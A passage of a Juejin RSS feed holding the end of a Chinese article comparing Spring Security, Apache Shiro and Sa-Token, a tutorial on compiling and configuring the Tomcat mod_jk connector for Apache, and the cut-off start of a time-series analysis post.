    <span class="hljs-comment">// 强制注销（踢人下线）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">forceLogout</span><span class="hljs-params">(Object loginId)</span> {
        StpUtil.logout(loginId);
    }
    
    <span class="hljs-comment">// 封禁账号</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">disableAccount</span><span class="hljs-params">(Object loginId, <span class="hljs-type">long</span> disableTime)</span> {
        <span class="hljs-comment">// 封禁指定时间（单位：秒）</span>
        StpUtil.disable(loginId, disableTime);
    }
    
    <span class="hljs-comment">// 检查是否被封禁</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isDisabled</span><span class="hljs-params">(Object loginId)</span> {
        <span class="hljs-keyword">return</span> StpUtil.isDisable(loginId);
    }
    
    <span class="hljs-comment">// 二级认证（敏感操作需要再次验证）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">startSecondAuth</span><span class="hljs-params">(<span class="hljs-type">long</span> ttl)</span> {
        <span class="hljs-comment">// 开启二级认证，有效期为ttl秒</span>
        <span class="hljs-keyword">return</span> StpUtil.openSafe(ttl);
    }
    
    <span class="hljs-comment">// 检查二级认证</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkSecondAuth</span><span class="hljs-params">()</span> {
        StpUtil.checkSafe();
    }
}
</code></pre>
<h3 data-id="heading-16">Sa-Token的优势与痛点</h3>
<p><strong>优势：</strong></p>
<ol>
<li><strong>API设计极其简洁</strong>：<code>StpUtil.xxx()</code> 几乎涵盖了所有操作</li>
<li><strong>开箱即用</strong>：几乎零配置就能使用</li>
<li><strong>功能丰富</strong>：除了基础认证授权，还提供踢人下线、账号封禁、二级认证等高级功能</li>
<li><strong>国产框架</strong>：中文文档完善，符合国人使用习惯</li>
<li><strong>轻量级</strong>：依赖少，启动快</li>
</ol>
<p><strong>痛点：</strong></p>
<ol>
<li><strong>相对较新</strong>：生态不如Spring Security和Shiro成熟</li>
<li><strong>社区规模小</strong>：遇到复杂问题可能难以找到解决方案</li>
<li><strong>企业级特性有限</strong>：对OAuth2、LDAP等支持较弱</li>
<li><strong>过度封装</strong>：某些场景下灵活性不足</li>
</ol>
<p><strong>适用场景：</strong></p>
<ul>
<li>中小型项目，追求开发效率</li>
<li>团队对Spring Security/Shiro不熟悉</li>
<li>需要快速搭建权限系统的原型或内部工具</li>
<li>偏好国产框架和中文文档的团队</li>
</ul>
<p>有些小伙伴第一次用Sa-Token时，会被它的简洁惊艳到。几行代码就实现了其他框架需要大量配置的功能。</p>
<p>但对于大型复杂系统，可能需要仔细评估它的扩展性和长期维护性。</p>
<h2 data-id="heading-17">5 三大框架全方位对比</h2>
<p>了解了每个框架的单独特点后，我们来一个全方位的对比：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c659ee10212142dca4427b30d9d06a55~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767613200&amp;x-signature=sSb%2BHG2SL%2BGExFCQE2vL7X2g%2BAc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-18">5.1 详细对比表</h3>

































































<table><thead><tr><th>维度</th><th><strong>Spring Security</strong></th><th><strong>Apache Shiro</strong></th><th><strong>Sa-Token</strong></th></tr></thead><tbody><tr><td><strong>学习曲线</strong></td><td>陡峭 ⭐⭐⭐⭐⭐</td><td>中等 ⭐⭐⭐☆☆</td><td>平缓 ⭐⭐☆☆☆</td></tr><tr><td><strong>配置复杂度</strong></td><td>复杂 ⭐⭐⭐⭐⭐</td><td>中等 ⭐⭐⭐☆☆</td><td>简单 ⭐☆☆☆☆</td></tr><tr><td><strong>功能完整性</strong></td><td>全面 ⭐⭐⭐⭐⭐</td><td>完整 ⭐⭐⭐⭐☆</td><td>丰富 ⭐⭐⭐☆☆</td></tr><tr><td><strong>Spring生态集成</strong></td><td>原生 ⭐⭐⭐⭐⭐</td><td>良好 ⭐⭐⭐☆☆</td><td>良好 ⭐⭐⭐☆☆</td></tr><tr><td><strong>性能开销</strong></td><td>较高 ⭐⭐⭐☆☆</td><td>中等 ⭐⭐⭐☆☆</td><td>较低 ⭐⭐☆☆☆</td></tr><tr><td><strong>社区活跃度</strong></td><td>活跃 ⭐⭐⭐⭐⭐</td><td>一般 ⭐⭐⭐☆☆</td><td>增长 ⭐⭐⭐☆☆</td></tr><tr><td><strong>文档质量</strong></td><td>优秀（英文）⭐⭐⭐⭐⭐</td><td>良好 ⭐⭐⭐☆☆</td><td>优秀（中文）⭐⭐⭐⭐⭐</td></tr><tr><td><strong>扩展性</strong></td><td>强大 ⭐⭐⭐⭐⭐</td><td>良好 ⭐⭐⭐☆☆</td><td>一般 ⭐⭐⭐☆☆</td></tr><tr><td><strong>企业级特性</strong></td><td>丰富 ⭐⭐⭐⭐⭐</td><td>有限 ⭐⭐☆☆☆</td><td>有限 ⭐⭐☆☆☆</td></tr></tbody></table>
<h3 data-id="heading-19">5.2 技术特性详细对比</h3>



























































<table><thead><tr><th>特性</th><th>Spring Security</th><th>Apache Shiro</th><th>Sa-Token</th></tr></thead><tbody><tr><td><strong>认证方式</strong></td><td>表单、Basic、OAuth2、LDAP、SAML等</td><td>表单、Basic、CAS等</td><td>表单、自定义</td></tr><tr><td><strong>授权模型</strong></td><td>RBAC、ABAC、方法级、URL级</td><td>RBAC、URL级、方法级</td><td>RBAC、方法级</td></tr><tr><td><strong>会话管理</strong></td><td>支持，与Spring Session集成</td><td>强大，自带会话管理</td><td>支持，简单易用</td></tr><tr><td><strong>密码加密</strong></td><td>多种加密方式支持</td><td>多种加密方式支持</td><td>支持</td></tr><tr><td><strong>缓存支持</strong></td><td>需要自行集成Spring Cache</td><td>内置缓存支持</td><td>支持Redis等</td></tr><tr><td><strong>单点登录</strong></td><td>通过Spring Security OAuth2</td><td>需要额外模块</td><td>需要额外模块</td></tr><tr><td><strong>微服务支持</strong></td><td>优秀，与Spring Cloud GateWay集成</td><td>一般</td><td>支持</td></tr><tr><td><strong>监控管理</strong></td><td>与Spring Boot Actuator集成</td><td>需要自行实现</td><td>简单监控</td></tr></tbody></table>
<h2 data-id="heading-20">6 如何做出最佳选择？</h2>
<p>面对三个各有优劣的框架，如何做出最适合自己项目的选择？</p>
<p>我总结了一个决策流程图，帮助你在不同场景下做出明智决策：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ee998750388478c84fbd1b221a5ccd9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767613200&amp;x-signature=Bu0r3mNtagDvb1jQH%2BFTw0mhQrY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-21">6.1 具体场景建议</h3>
<h4 data-id="heading-22">场景一：大型电商平台（选择Spring Security）</h4>
<ul>
<li><strong>理由</strong>：需要完善的OAuth2社交登录、支付安全、风控系统</li>
<li><strong>实施要点</strong>：
<ol>
<li>使用Spring Security OAuth2 Client集成第三方登录</li>
<li>自定义安全过滤器实现风控逻辑</li>
<li>与Spring Cloud Gateway整合实现统一认证</li>
<li>使用Method Security注解实现细粒度权限控制</li>
</ol>
</li>
</ul>
<h4 data-id="heading-23">场景二：企业内部管理系统（选择Apache Shiro）</h4>
<ul>
<li><strong>理由</strong>：权限模型相对固定，需要快速开发，团队熟悉Shiro</li>
<li><strong>实施要点</strong>：
<ol>
<li>使用INI配置文件快速定义URL权限规则</li>
<li>集成Ehcache缓存权限数据提升性能</li>
<li>自定义Realm连接企业LDAP/AD域</li>
<li>利用Shiro标签在页面上控制元素显示</li>
</ol>
</li>
</ul>
<h4 data-id="heading-24">场景三：创业公司MVP产品（选择Sa-Token）</h4>
<ul>
<li><strong>理由</strong>：需要快速上线验证想法，团队规模小，追求开发效率</li>
<li><strong>实施要点</strong>：
<ol>
<li>利用Sa-Token的零配置特性快速搭建</li>
<li>使用注解方式实现基本权限控制</li>
<li>集成Redis实现分布式会话</li>
<li>利用Sa-Token的踢人功能实现基础管理</li>
</ol>
</li>
</ul>
<h4 data-id="heading-25">场景四：微服务架构系统（混合方案）</h4>
<ul>
<li><strong>理由</strong>：不同服务有不同的安全需求</li>
<li><strong>实施要点</strong>：
<ol>
<li><strong>网关层</strong>：Spring Security + OAuth2（统一认证）</li>
<li><strong>核心业务服务</strong>：Spring Security（细粒度控制）</li>
<li><strong>内部管理服务</strong>：Apache Shiro（简单权限）</li>
<li><strong>工具类微服务</strong>：Sa-Token（快速开发）</li>
</ol>
</li>
</ul>
<h3 data-id="heading-26">6.2 如果选错了怎么办？</h3>
<p>有些小伙伴可能会遇到这样的情况：项目初期选型不合适，随着业务发展需要迁移到其他框架。</p>
<p>这里提供一些迁移建议：</p>
<ol>
<li><strong>渐进式迁移</strong>：新旧框架并行，逐步替换</li>
<li><strong>抽象隔离层</strong>：创建统一的安全接口，底层实现可替换</li>
<li><strong>分模块迁移</strong>：按业务模块逐个迁移，降低风险</li>
<li><strong>充分测试</strong>：特别是边缘案例和权限组合场景</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 抽象安全接口示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SecurityService</span> {
    <span class="hljs-comment">// 认证相关</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">login</span><span class="hljs-params">(String username, String password)</span>;
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">logout</span><span class="hljs-params">()</span>;
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAuthenticated</span><span class="hljs-params">()</span>;
    
    <span class="hljs-comment">// 授权相关</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasPermission</span><span class="hljs-params">(String permission)</span>;
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasRole</span><span class="hljs-params">(String role)</span>;
    
    <span class="hljs-comment">// 用户信息</span>
    Object <span class="hljs-title function_">getCurrentUser</span><span class="hljs-params">()</span>;
    Long <span class="hljs-title function_">getCurrentUserId</span><span class="hljs-params">()</span>;
}

<span class="hljs-comment">// Spring Security实现</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringSecurityServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SecurityService</span> {
    <span class="hljs-comment">// 实现基于Spring Security的接口</span>
}

<span class="hljs-comment">// 需要迁移时，只需实现新的实现类</span>
<span class="hljs-meta">@Service</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SaTokenServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SecurityService</span> {
    <span class="hljs-comment">// 实现基于Sa-Token的接口</span>
    <span class="hljs-comment">// 业务代码无需修改，只需切换实现</span>
}
</code></pre>
<h2 data-id="heading-27">总结</h2>
<p>经过深入分析，我们可以得出以下结论：</p>
<ol>
<li><strong>Spring Security</strong>是<strong>企业级重型武器</strong>，功能全面但复杂，适合大型项目和有经验的团队。</li>
<li><strong>Apache Shiro</strong>是<strong>灵活实用的轻骑兵</strong>，平衡了功能与复杂度，适合大多数中小型项目。</li>
<li><strong>Sa-Token</strong>是<strong>快速开发的利器</strong>，API简洁但生态相对年轻，适合追求开发效率的场景。</li>
</ol>
<p>实际上，<strong>没有完美的框架，只有合适的框架</strong>。</p>
<h2 data-id="heading-28">最后说一句(求关注，别白嫖我)</h2>
<p>如果这篇文章对您有所帮助，或者有所启发的话，帮忙关注一下我的同名公众号：苏三说技术，您的支持是我坚持写作最大的动力。</p>
<p>求一键三连：点赞、转发、在看。</p>
<p>关注公众号：【苏三说技术】，在公众号中回复：进大厂，可以免费获取我最近整理的10万字的面试宝典，好多小伙伴靠这个宝典拿到了多家大厂的offer。</p>
<p>更多项目实战在我的技术网站：<a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.susan.net.cn%2Fproject" title="https://link.juejin.cn?target=http%3A%2F%2Fwww.susan.net.cn%2Fproject" target="_blank">www.susan.net.cn/project</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Tomcat Connectors 1.2.32 源码编译安装教程（含 mod_jk 配置步骤）]]></title>    <link>https://juejin.cn/post/7589093939656507444</link>    <guid>https://juejin.cn/post/7589093939656507444</guid>    <pubDate>2025-12-29T11:43:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589093939656507444" data-draft-id="7589104492882673716" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Tomcat Connectors 1.2.32 源码编译安装教程（含 mod_jk 配置步骤）"/> <meta itemprop="keywords" content="Tomcat"/> <meta itemprop="datePublished" content="2025-12-29T11:43:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户613541146016"/> <meta itemprop="url" content="https://juejin.cn/user/1602431422584832"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Tomcat Connectors 1.2.32 源码编译安装教程（含 mod_jk 配置步骤）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1602431422584832/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户613541146016
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T11:43:36.000Z" title="Mon Dec 29 2025 11:43:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<p><strong>1. 准备环境</strong></p>
<p>先装好这些东西：</p>
<ul>
<li><strong>Apache HTTP Server</strong>（就是 Apache）</li>
<li><strong>Tomcat</strong></li>
<li>编译器：<strong>gcc</strong>、<strong>make</strong></li>
<li>Java 开发环境（JDK）</li>
</ul>
<p>在 Ubuntu/Debian 上你可以这么装：</p>
<pre><code class="hljs language-sql" lang="sql">sudo apt <span class="hljs-keyword">update</span>
sudo apt install build<span class="hljs-operator">-</span>essential apache2 tomcat9 openjdk<span class="hljs-number">-11</span><span class="hljs-operator">-</span>jdk
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-0">2. 下载并解压源码</h3>
<p><strong>安装包下载：</strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fpan.quark.cn%2Fs%2F220ddde3d4ce" title="https://pan.quark.cn/s/220ddde3d4ce" target="_blank" ref="nofollow noopener noreferrer">pan.quark.cn/s/220ddde3d…</a>****，假设你已经下载了 <code>tomcat-connectors-1.2.32-src.tar.gz</code>：</p>
<pre><code class="hljs language-bash" lang="bash">tar -xzf tomcat-connectors-1.2.32-src.tar.gz
<span class="hljs-built_in">cd</span> tomcat-connectors-1.2.32-src/native
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-1">3. 设置环境变量</h3>
<p>要让编译知道 Apache 和 Tomcat 在哪，得设置几个变量：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-variable constant_">APACHE_HOME</span>=<span class="hljs-regexp">/usr/</span>local/apache2   # 或者你 <span class="hljs-title class_">Apache</span> 实际安装路径
<span class="hljs-keyword">export</span> <span class="hljs-variable constant_">TOMCAT_HOME</span>=<span class="hljs-regexp">/usr/</span>share/tomcat9   # 或者你 <span class="hljs-title class_">Tomcat</span> 的路径
<span class="hljs-keyword">export</span> <span class="hljs-variable constant_">JAVA_HOME</span>=<span class="hljs-regexp">/usr/</span>lib/jvm/java-<span class="hljs-number">11</span>-openjdk-amd64
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<blockquote>
<p>注意：路径要根据你自己系统实际情况改。</p>
</blockquote>
<hr/>
<h3 data-id="heading-2">4. 配置和编译</h3>
<p>进入 native 目录后执行：</p>
<pre><code class="hljs language-javascript" lang="javascript">./configure --<span class="hljs-keyword">with</span>-apxs=<span class="hljs-regexp">/usr/</span>bin/apxs2
make
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<ul>
<li><code>--with-apxs</code>是指定 apxs 工具的路径，一般在 <code>/usr/bin/apxs2</code>或 <code>/usr/bin/apxs</code></li>
<li>如果提示找不到 apxs，可以装：<code>sudo apt install apache2-dev</code></li>
</ul>
<hr/>
<h3 data-id="heading-3">5. 安装模块</h3>
<p>编译完会生成一个 <code>.so</code>文件（比如 <code>mod_jk.so</code>），把它复制到 Apache 的模块目录：</p>
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">cp</span> apache-2.0/mod_jk.so /usr/lib/apache2/modules/
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-4">6. 配置 Apache 加载 mod_jk</h3>
<p>编辑 Apache 配置文件（比如 <code>/etc/apache2/apache2.conf</code>或新建一个 <code>/etc/apache2/mods-available/jk.load</code>）：</p>
<pre><code class="hljs language-bash" lang="bash">LoadModule jk_module modules/mod_jk.so
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>然后启用模块：</p>
<pre><code class="hljs">sudo a2enmod jk
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-5">7. 配置 workers（告诉 Apache 怎么连 Tomcat）</h3>
<p>创建文件 <code>/etc/apache2/workers.properties</code>，内容类似：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">worker.list</span>=worker1
<span class="hljs-attr">worker.worker1.type</span>=ajp13
<span class="hljs-attr">worker.worker1.host</span>=localhost
<span class="hljs-attr">worker.worker1.port</span>=<span class="hljs-number">8009</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>再创建一个配置文件 <code>/etc/apache2/jk.conf</code>（或加到 apache2.conf 里）：</p>
<pre><code class="hljs language-bash" lang="bash">JkWorkersFile /etc/apache2/workers.properties
JkMount /* worker1
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-6">8. 重启 Apache 和 Tomcat</h3>
<pre><code class="hljs">sudo systemctl restart apache2
sudo systemctl restart tomcat9
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-7">9. 测试</h3>
<p>放个 JSP 页面到 Tomcat 的 webapps 目录下，比如 <code>test.jsp</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript">&lt;%= <span class="hljs-keyword">new</span> java.<span class="hljs-property">util</span>.<span class="hljs-title class_">Date</span>() %&gt;
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>然后通过 Apache 访问：<code>http://你的服务器/test.jsp</code>，如果能显示时间，说明成功了。</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[数据分析师的“水晶球”：时间序列分析]]></title>    <link>https://juejin.cn/post/7588680081326293034</link>    <guid>https://juejin.cn/post/7588680081326293034</guid>    <pubDate>2025-12-28T09:30:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588680081326293034" data-draft-id="7588152122187530294" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="数据分析师的“水晶球”：时间序列分析"/> <meta itemprop="keywords" content="Python,数据分析,数据挖掘"/> <meta itemprop="datePublished" content="2025-12-28T09:30:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="databook"/> <meta itemprop="url" content="https://juejin.cn/user/3526889035006702"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            数据分析师的“水晶球”：时间序列分析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3526889035006702/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    databook
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T09:30:08.000Z" title="Sun Dec 28 2025 09:30:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 